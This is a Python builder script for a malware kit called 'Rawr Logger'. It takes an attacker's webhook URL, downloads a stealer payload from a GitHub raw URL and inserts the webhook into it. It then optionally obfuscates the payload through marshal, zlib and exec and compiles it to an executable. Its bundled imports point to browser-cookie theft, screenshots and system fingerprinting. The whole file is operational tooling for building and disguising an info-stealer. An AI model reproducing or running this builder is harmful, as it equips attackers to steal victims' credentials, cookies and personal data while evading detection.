import marshal
import zlib
import requests
from pystyle import *
import os
import time
import shutil
os.system(f'cls & title Rawr Logger Builder!')
Write.Print(Center.XCenter("""
    ____                         __                               
   / __ \____ __      _______   / /   ____  ____ _____ ____  _____
  / /_/ / __ `/ | /| / / ___/  / /   / __ \/ __ `/ __ `/ _ \/ ___/
 / _, _/ /_/ /| |/ |/ / /     / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_|\__,_/ |__/|__/_/     /_____/\____/\__, /\__, /\___/_/     
                                         /____//____/             
              Made By Jose#0001,TheSoap1#9870                                                                                  
\n"""), Colors.green_to_yellow, interval=0)
webhook = Write.Input("\nEnter webhook URL:", Colors.green_to_yellow, interval=0.01)
r = requests.get(webhook)
if r.status_code == 200:
         Write.Print("Webhook Is Working\n",Colors.white_to_green, interval=0.01) 
         time.sleep(1) 
else: 
    Write.Print("Webhook Is Not Working\n",Colors.white_to_red, interval=0.01) 
    time.sleep(3) 
    exit()
name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/logger.py")
with open(f"{name}.py", 'w', encoding='utf8') as f:
    f.write(code.text.replace("Webhooksss", webhook))
Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
prot = Write.Input("Would you like to add protection y/n:",Colors.white_to_green, interval=0.01)
if prot == 'y':
    with open(f'{name}.py') as fi:
        pro = fi.read()
    mar = marshal.dumps(pro)
    zlb = zlib.compress(mar)
    with open(f"{name}.py", 'w') as f:
        f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
    if compile == "y":
      os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" {name}.py')
      os.remove(f'{name}.spec')
      Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
      time.sleep(2)
      Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
      time.sleep(3)
      exit()
    elif compile == "n":
      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
      time.sleep(3)
      exit()


elif prot == 'n':
    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
    if compile == "y":
      os.system(f"pyinstaller --onefile {name}.py")
      shutil.rmtree('build')
      os.remove(f'{name}.spec')
      Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
      time.sleep(2)
      Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
      time.sleep(3)
      exit()
    elif compile == "n":
      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
      time.sleep(3)
      exit()
